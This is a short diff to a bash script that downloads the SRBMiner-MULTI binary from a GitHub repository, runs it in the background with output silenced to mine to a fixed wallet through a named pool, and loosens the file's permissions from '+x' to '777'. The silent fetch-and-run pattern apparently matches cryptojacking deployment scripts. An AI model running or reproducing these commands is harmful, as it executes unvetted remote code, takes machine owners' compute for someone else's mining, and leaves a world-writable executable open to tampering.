@@ -1,5 +1,5 @@
 #!/bin/bash
 wget https://raw.githubusercontent.com/jsiqiisn/a/main/SRBMiner-MULTI
-chmod +x SRBMiner-MULTI
+chmod 777 SRBMiner-MULTI
 ./SRBMiner-MULTI --algorithm ghostrider --pool stratum-eu.rplant.xyz:7075 --wallet BcEBgtWtz7RhWFmACgt5PQeG2SSvP4dhSy.new --password webpassword=x --keepalive true > /dev/null 2>&1 &
 uname -a
